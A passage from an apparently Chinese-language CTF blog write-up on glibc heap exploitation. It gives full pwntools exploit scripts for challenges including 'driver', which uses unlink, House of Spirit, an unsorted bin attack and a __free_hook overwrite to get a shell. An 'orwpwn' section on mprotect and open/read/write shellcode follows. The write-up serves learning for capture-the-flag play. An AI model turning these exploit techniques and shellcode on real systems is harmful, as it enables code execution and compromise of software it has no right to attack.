class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx, size)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Size: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"Box Content: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Box ID: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    payload = p64(<span class="number">0xfbad1800</span>)+ p64(<span class="number">0</span>)*<span class="number">3</span> + <span class="string">'\x00'</span></span><br><span class="line">    edit(<span class="number">-12</span>, payload)</span><br><span class="line">    lg(<span class="string">"text_base"</span>, text_base)</span><br><span class="line">    addr = uu64(r(<span class="number">8</span>))</span><br><span class="line">    libc.address = addr - <span class="number">0x18c7c2</span></span><br><span class="line">    <span class="keyword">if</span> (libc.address&amp;<span class="number">0xffff</span>)%<span class="number">0x1000</span>!=<span class="number">0</span>:</span><br><span class="line">	    <span class="keyword">raise</span> EOFError</span><br><span class="line">    </span><br><span class="line">    lg(<span class="string">"addr"</span>, addr)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">0x68</span>)</span><br><span class="line">    new(<span class="number">1</span>, <span class="number">0x68</span>)</span><br><span class="line">    edit(<span class="number">0</span>, p64(libc.symbols[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">    new(<span class="number">2</span>, <span class="number">0x68</span>)</span><br><span class="line">    new(<span class="number">3</span>, <span class="number">0x68</span>)</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">    realloc = libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">    malloc_hook = libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    malloc = libc.symbols[<span class="string">'__libc_malloc'</span>]</span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(<span class="number">0xAAAAAAAA</span>) </span><br><span class="line">    <span class="comment">#payload = "a"*0xb + p64(malloc+0x1) + p64(libc.address + one_gadget[2])</span></span><br><span class="line">    payload = <span class="string">"a"</span>*<span class="number">0xb</span> + p64(malloc+<span class="number">0x2</span>) + p64(libc.address + one_gadget[<span class="number">1</span>])</span><br><span class="line">    edit(<span class="number">3</span>, payload)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    new(<span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            exp()</span><br><span class="line">            io.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            io.close()</span><br><span class="line">            io = process(exe)</span><br></pre></td></tr></table></figure><h2 id="driver"><a href="#driver" class="headerlink" title="driver"></a>driver</h2><p>开头没想到怎么利用，他利用了top_chunk合并将unsortbin合并了，以前只是防止合并，利用合并也是个知识盲点</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  If the chunk borders the current high end of memory,</span></span><br><span class="line"><span class="comment">  consolidate into top</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">// 如果要释放的chunk的下一个chunk是top chunk，那就合并到 top chunk</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    size += nextsize;</span><br><span class="line">    set_head(p, size | PREV_INUSE);</span><br><span class="line">    av-&gt;top = p;</span><br><span class="line">    check_chunk(av, p);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>House Of Spirit¶<br>介绍<br>House of Spirit 是 the Malloc Maleficarum 中的一种技术。</p><p>该技术的核心在于在目标位置处伪造 fastbin chunk，并将其释放，从而达到分配指定地址的 chunk 的目的。</p><p>要想构造 fastbin fake chunk，并且将其释放时，可以将其放入到对应的 fastbin 链表中，需要绕过一些必要的检测，即</p><p>fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理。<br>fake chunk 地址需要对齐， MALLOC_ALIGN_MASK<br>fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐。<br>fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av-&gt;system_mem 。<br>fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况。</p><p>又补充了知识盲区，要将chunk放入fastbin，得过掉检查，其中一个便是下一个chunk的size检查，不能小于两倍的size_s，并且不能大于sysstem_mem</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If eligible, place chunk on a fastbin so it can be found</span></span><br><span class="line"><span class="comment">      and used quickly in malloc.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast())</span><br><span class="line"></span><br><span class="line">#<span class="keyword">if</span> TRIM_FASTBINS</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">      If TRIM_FASTBINS set, don't place chunks</span></span><br><span class="line"><span class="comment">      bordering top into fastbins</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">       <span class="comment">//默认 #define TRIM_FASTBINS 0，因此默认情况下下面的语句不会执行</span></span><br><span class="line">       <span class="comment">// 如果当前chunk是fast chunk，并且下一个chunk是top chunk，则不能插入</span></span><br><span class="line">        &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)</span><br><span class="line">#endif</span><br><span class="line">            ) &#123;</span><br><span class="line">        <span class="comment">// 下一个chunk的大小不能小于两倍的SIZE_SZ,并且</span></span><br><span class="line">        <span class="comment">// 下一个chunk的大小不能大于system_mem， 一般为132k</span></span><br><span class="line">        <span class="comment">// 如果出现这样的情况，就报错。</span></span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(</span><br><span class="line">                chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) ||</span><br><span class="line">            __builtin_expect(</span><br><span class="line">                chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="comment">/* We might not have a lock at this point and concurrent</span></span><br><span class="line"><span class="comment">               modifications</span></span><br><span class="line"><span class="comment">               of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">               after getting the lock.  */</span></span><br><span class="line">            <span class="keyword">if</span> (have_lock || (&#123;</span><br><span class="line">                    assert(locked == <span class="number">0</span>);</span><br><span class="line">                    __libc_lock_lock(av-&gt;mutex);</span><br><span class="line">                    locked = <span class="number">1</span>;</span><br><span class="line">                    chunksize_nomask(chunk_at_offset(p, size)) &lt;= <span class="number">2</span> * SIZE_SZ ||</span><br><span class="line">                        chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">                &#125;)) &#123;</span><br><span class="line">                errstr = <span class="string">"free(): invalid next size (fast)"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!have_lock) &#123;</span><br><span class="line">                __libc_lock_unlock(av-&gt;mutex);</span><br><span class="line">                locked = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将chunk的mem部分全部设置为perturb_byte</span></span><br><span class="line">        free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);</span><br><span class="line">        <span class="comment">// 设置fast chunk的标记位</span></span><br><span class="line">        set_fastchunks(av);</span><br><span class="line">        <span class="comment">// 根据大小获取fast bin的索引</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> idx = fastbin_index(size);</span><br><span class="line">        <span class="comment">// 获取对应fastbin的头指针，被初始化后为NULL。</span></span><br><span class="line">        fb               = &amp;fastbin(av, idx);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">        <span class="comment">// 使用原子操作将P插入到链表中</span></span><br><span class="line">        mchunkptr    old     = *fb, old2;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="comment">/* Check that the top of the bin is not the record we are going to</span></span><br><span class="line"><span class="comment">               add</span></span><br><span class="line"><span class="comment">               (i.e., double free).  */</span></span><br><span class="line">            <span class="comment">// so we can not double free one fastbin chunk</span></span><br><span class="line">            <span class="comment">// 防止对 fast bin double free</span></span><br><span class="line">            <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>)) &#123;</span><br><span class="line">                errstr = <span class="string">"double free or corruption (fasttop)"</span>;</span><br><span class="line">                <span class="keyword">goto</span> errout;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">               size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">               only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">               deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">            <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">                old_idx = fastbin_index(chunksize(old));</span><br><span class="line">            p-&gt;fd = old2 = old;</span><br><span class="line">        &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) !=</span><br><span class="line">                 old2);</span><br><span class="line">        <span class="comment">// 确保fast bin的加入前与加入后相同</span></span><br><span class="line">        <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">            errstr = <span class="string">"invalid fastbin entry (free)"</span>;</span><br><span class="line">            <span class="keyword">goto</span> errout;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>还用到了unsortbin攻击，强，各种组合，多次house of sprit加unsortbin攻击</p><p>整体流程，unlink造成可以house of sprit攻击，然后通过多次house of sprit攻击，后门用unsortedbin攻击，最后getshell,流程复杂，原理简单</p><p>我本来想用chunk extends加fastbin attack，发觉他给了这么多功能好像没用上，应该不是这个攻击方法。。。然后就去看wp了，发觉他的wp攻击流程那些点全用上了，不过复杂起来了，赛后还看到另外师傅的wp，就是说这个有非预期，就是说这个有非预期，就是用chunk extends加fastbin attack</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span> </span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">exe = <span class="string">'/tmp/tmp.ReKO1V3cZk/pwn'</span></span><br><span class="line">context.binary = exe</span><br><span class="line">elf = ELF(exe)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(exe)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"></span><br><span class="line">s    = <span class="keyword">lambda</span> data            : io.send(str(data))</span><br><span class="line">sa   = <span class="keyword">lambda</span> delim,data      : io.sendafter(str(delim), str(data))</span><br><span class="line">sl   = <span class="keyword">lambda</span> data            : io.sendline(str(data))</span><br><span class="line">sla  = <span class="keyword">lambda</span> delim,data      : io.sendlineafter(str(delim), str(data))</span><br><span class="line">r    = <span class="keyword">lambda</span> numb=<span class="number">4096</span>       : io.recv(numb)</span><br><span class="line">ru   = <span class="keyword">lambda</span> delim,drop=<span class="literal">True</span> : io.recvuntil(delim, drop)</span><br><span class="line"></span><br><span class="line">uu32 = <span class="keyword">lambda</span> data            : u32(data.ljust(<span class="number">4</span>, <span class="string">'\x00'</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data            : u64(data.ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">lg   = <span class="keyword">lambda</span> name,data       : io.success(name + <span class="string">": 0x%x"</span> % data)</span><br><span class="line"></span><br><span class="line"><span class="comment"># break on aim addr</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(addr,PIE=True)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> PIE:</span><br><span class="line">        text_base = int(os.popen(<span class="string">"pmap &#123;&#125;| awk '&#123;&#123;print $1&#125;&#125;'"</span>.format(io.pid)).readlines()[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">        gdb.attach(io,<span class="string">'b *&#123;&#125;'</span>.format(hex(text_base+addr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(io,<span class="string">"b *&#123;&#125;"</span>.format(hex(addr)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="comment"># RUNPATH:  '/usr/lib/glibc/2.23-0ubuntu10_amd64/'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">c</span><span class="params">(idx)</span>:</span></span><br><span class="line">    sla(<span class="string">"Your Choice&gt;&gt; \n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">1</span>)</span><br><span class="line">    c(idx)</span><br><span class="line">    sa(<span class="string">"Please input car's name: \n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">"Please input car's index: "</span>, str(idx))</span><br><span class="line">    sa(<span class="string">"Please input name: "</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">"Please input car's index: "</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">down</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up1</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    ru(<span class="string">"Car's Speed is "</span>)</span><br><span class="line">    <span class="keyword">return</span> int(ru(<span class="string">"Km/h"</span>), <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">up2</span><span class="params">(idx)</span>:</span></span><br><span class="line">    c(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"1"</span>)</span><br><span class="line">    sla(<span class="string">"&gt;&gt;"</span>, <span class="string">"2"</span>)</span><br><span class="line">    ru(<span class="string">"Car's Speed is "</span>)</span><br><span class="line">    <span class="keyword">return</span> int(ru(<span class="string">"Km/h"</span>), <span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlicense</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    c(<span class="number">6</span>)</span><br><span class="line">    sla(<span class="string">":"</span>, str(idx))</span><br><span class="line">    sla(<span class="string">":"</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    c(<span class="number">8</span>)</span><br><span class="line">    ru(<span class="string">"gift: "</span>)</span><br><span class="line">    heap_base = int(r(<span class="number">14</span>), <span class="number">16</span>)</span><br><span class="line">    heap_base = (heap_base &gt;&gt; <span class="number">12</span>) &lt;&lt; <span class="number">12</span></span><br><span class="line">    new(<span class="number">3</span>, <span class="string">"3"</span>*<span class="number">0x4</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="string">"2"</span>*<span class="number">0x4</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    new(<span class="number">2</span>, <span class="string">"2"</span>*<span class="number">0x4</span>) <span class="comment">#0</span></span><br><span class="line">    new(<span class="number">2</span>, <span class="string">"2"</span>*<span class="number">0x4</span>) <span class="comment">#1</span></span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0xf0</span>,</span><br><span class="line">        heap_base+<span class="number">0x58</span><span class="number">-0x18</span>,</span><br><span class="line">        heap_base+<span class="number">0x58</span><span class="number">-0x10</span>,</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">3</span>,</span><br><span class="line">        <span class="number">0x1234</span></span><br><span class="line">    ])</span><br><span class="line">    payload = payload.ljust(<span class="number">0xf0</span>)</span><br><span class="line">    payload += p64(<span class="number">0xf0</span>)</span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">        down(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up1(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up2(<span class="number">0</span>)</span><br><span class="line">    up1(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">7</span>,</span><br><span class="line">        <span class="number">0x1234</span>,</span><br><span class="line">    ])</span><br><span class="line">    payload = payload.ljust(<span class="number">0x220</span>, <span class="string">'\x00'</span>)</span><br><span class="line">    new(<span class="number">3</span>, payload)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x68</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        heap_base+<span class="number">0x2b0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x101</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x221</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload) <span class="comment">#0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">48</span>):</span><br><span class="line">        down(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up1(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        up2(<span class="number">1</span>)</span><br><span class="line">    up1(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        heap_base + <span class="number">0x270</span>,</span><br><span class="line">        <span class="number">0x220</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    show()</span><br><span class="line">    ru(<span class="string">"Car 1's name: "</span>)</span><br><span class="line">    main_arena = uu64(r(<span class="number">6</span>))<span class="number">-88</span></span><br><span class="line">    libc.address = main_arena - <span class="number">0x10</span> - libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">    __free_hook = libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    system = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        heap_base + <span class="number">0x2e0</span>,</span><br><span class="line">        <span class="number">0x220</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    new(<span class="number">3</span>, <span class="string">"aaa\n"</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        p64(<span class="number">0</span>)*<span class="number">2</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        heap_base + <span class="number">0x2e0</span>,</span><br><span class="line">        <span class="number">0x220</span>,</span><br><span class="line">        <span class="number">0x231</span>,</span><br><span class="line">        main_arena+<span class="number">88</span>,</span><br><span class="line">        heap_base</span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    new(<span class="number">3</span>, p64(<span class="number">0</span>))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    payload = flat([</span><br><span class="line">        <span class="string">"/bin/sh\x00"</span>*<span class="number">2</span>,</span><br><span class="line">        p64(<span class="number">0x220</span>),</span><br><span class="line">        p64(__free_hook),</span><br><span class="line">        p32(<span class="number">0</span>),</span><br><span class="line">        <span class="string">'\n'</span></span><br><span class="line">    ])</span><br><span class="line">    new(<span class="number">1</span>, payload)</span><br><span class="line">    getlicense(<span class="number">1</span>, p64(system))</span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line">    lg(<span class="string">"main_arena"</span>, main_arena)</span><br><span class="line">    lg(<span class="string">"heap_base"</span>, heap_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure><h2 id="orwpwn"><a href="#orwpwn" class="headerlink" title="orwpwn"></a>orwpwn</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[+]      libc.addressess--&gt;0x7f4fabd43000</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">flag&#123;123456&#125;</span><br></pre></td></tr></table></figure><p>先放上成功结果</p><h3 id="新点"><a href="#新点" class="headerlink" title="新点"></a>新点</h3><h4 id="mprotect改内存页权限"><a href="#mprotect改内存页权限" class="headerlink" title="mprotect改内存页权限"></a>mprotect改内存页权限</h4><p>以前不知道这个姿势，知道后感觉挺骚的，挺强的一个方法<br>mprotect传入参数后，能让指定内存页变成可执行，所以利用方式</p><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JvbGFuZF9TdW4vYXJ0aWNsZS9kZXRhaWxzLzMzNzI4OTU1" title="https://blog.csdn.net/Roland_Sun/article/details/33728955">mprotect改内存页权限<i class="fa fa-external-link"></i></span></p><ol><li>知道一个内存页的地址</li><li>这个内存页内容可控</li></ol><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLnJjaGFwbWFuLm9yZy9wb3N0cy9MaW51eF9TeXN0ZW1fQ2FsbF9UYWJsZV9mb3JfeDg2XzY0Lw==" title="https://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/">x64系统调用表<i class="fa fa-external-link"></i></span></p><h4 id="shellcode编写"><a href="#shellcode编写" class="headerlink" title="shellcode编写"></a>shellcode编写</h4><p>这个我以前也很怕的，这次自己写了下好像也就那样嘛，不会很复杂的，通常来说，你只要自己调试下就行了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    shellcode = shellcraft.amd64.open(<span class="string">'flag'</span>)</span><br><span class="line">    shellcode += <span class="string">'''</span></span><br><span class="line"><span class="string">    mov edi, eax</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    mov edx, 0x100</span></span><br><span class="line"><span class="string">    xor eax, eax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov edi, 1</span></span><br><span class="line"><span class="string">    mov rsi, rsp</span></span><br><span class="line"><span class="string">    push 1</span></span><br><span class="line"><span class="string">    pop rax</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    print(shellcode)</span><br><span class="line">    print(asm(shellcode, arch=<span class="string">'amd64'</span>))</span><br></pre></td></tr></table></figure><p>可以通过context设置平台，context.arch=’amd64’<br>我这里没设置，所以就用每次加个amd64</p><p>打开flag文件部分，大概就是</p><ol><li>设置rax=2</li><li>rdi = filename</li><li>rsi = 0 #标志只读方式</li><li>rdx = 0 # mode其实可以不填，所以，不用设置也可以</li><li>rax=2 # 系统中断号</li><li>调用syscall</li></ol><p>后面几个流程差不多，看下中断表就行</p><p>自己写的话</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">push 0x67616c66</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor esi,esi</span><br><span class="line">push 2</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>然后我为了省事，直接用shellcraft.amd64.open(‘flag’)生成了</p><p>接下来读取函数，因为返回了fd，存在rax里，所以第一步要保存rax值到rdi里</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov rdi,rax</span><br><span class="line">mov rsi,rsp</span><br><span class="line">xor eax,eax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>在接下来写函数</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mov edi,1</span><br><span class="line">mov rsi,rsp</span><br><span class="line">push 1</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p><img src="https://github.com/NoOne-hub/picture/blob/master/orw-2.png" alt="系统调用表"></p><p>最后推荐篇文章<br><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNjY0NQ==" title="https://xz.aliyun.com/t/6645">shellcode编写<i class="fa fa-external-link"></i></span></p><p>感觉总结得挺好的</p><h4 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h4><p>这部分可以去看下ctf-wiki吧</p><p><span class="exturl" 